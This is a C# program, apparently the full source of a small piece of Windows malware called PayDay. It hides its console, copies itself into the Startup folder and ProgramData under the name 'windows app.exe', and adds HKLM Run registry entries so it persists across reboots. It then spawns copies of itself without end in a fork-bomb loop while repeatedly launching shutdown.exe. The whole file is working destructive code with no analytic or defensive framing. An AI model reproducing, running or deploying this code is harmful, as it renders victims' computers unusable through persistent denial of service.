
/* (c) All Rights Reserved, Dashies Software Inc. */

using System;
using System.IO;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using System.Runtime.InteropServices;

namespace PayDay
{
    class Program
    {
        private static Boolean InjectHook()
        {
            try
            {
                if(Registry.GetValue("HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\Core", "Core", null) == null)
                {

                    RegistryKey RegKey;

                    RegKey = Registry.LocalMachine.CreateSubKey("System\\CurrentControlSet\\Services\\Core");
                    RegKey.SetValue("Core", "Hi");
                    RegKey.Close();

                    File.Copy(Application.ExecutablePath, "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\windows app.exe");
                    File.Copy(Application.ExecutablePath, "C:\\ProgramData\\app.exe");

                    RegKey = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
                    RegKey.SetValue("Runtime", "C:\\ProgramData\\app.exe");
                    RegKey.SetValue("Run", "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\windows app.exe");
                    RegKey.Close();

                    return false;

                }
                else
                {

                    return true;

                }
            } 
            
            catch
            {

                 return false; //MessageBox.Show("Must run as administrator ^o^");

            }
        }

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        static void Overload()
        {
            while(true)
            {
                Task Another = Task.Run((Action)Overload);

                System.Diagnostics.Process App = new System.Diagnostics.Process();

                App.StartInfo.CreateNoWindow = true;
                App.StartInfo.FileName = Application.ExecutablePath;
                App.Start();

                Task Get = Task.Run((Action)Overload);

                System.Diagnostics.Process Asp = new System.Diagnostics.Process();

                Asp.StartInfo.CreateNoWindow = true;
                Asp.StartInfo.FileName = "C:\\Windows\\System32\\shutdown.exe";
                Asp.Start();
            }
        }

        static void Main(string[] args)
        {
            ShowWindow(GetConsoleWindow(), 0);

            if(InjectHook() == true)
            {
                while(true)
                {
                    Task Get = Task.Run((Action)Overload);
                    Task Gut = Task.Run((Action)Overload);
                    Task Gat = Task.Run((Action)Overload);

                    System.Diagnostics.Process Asp = new System.Diagnostics.Process();

                    Asp.StartInfo.CreateNoWindow = true;
                    Asp.StartInfo.FileName = Application.ExecutablePath;
                    Asp.Start();
                }
            }

            System.Diagnostics.Process App = new System.Diagnostics.Process();

            App.StartInfo.CreateNoWindow = true;
            App.StartInfo.FileName = Application.ExecutablePath;
            App.Start();
        }
    }
}
